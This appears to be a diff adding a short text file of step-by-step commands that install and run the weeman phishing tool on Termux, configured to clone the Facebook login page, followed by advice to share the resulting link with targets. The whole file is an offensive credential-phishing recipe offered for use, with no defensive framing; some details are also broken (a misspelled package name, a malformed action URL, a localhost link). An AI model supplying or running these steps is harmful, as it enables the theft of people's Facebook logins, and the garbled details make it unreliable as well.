@@ -1,0 +1,27 @@
+pkg update && pkg upgrade
+ 
+pkg install python2
+
+pip2 install beutifulsoup
+
+pkg install git
+
+git clone https://github.com/evait-security/weeman
+
+cd weeman
+
+python2 weeman.py
+
+--------------------------------------------------
+
+set url https://facebook.com/login.php
+
+set port 8080
+
+set action_url https:facebook.com
+
+run
+
+well after that you just share the following url
+
+http://localhost:8080/
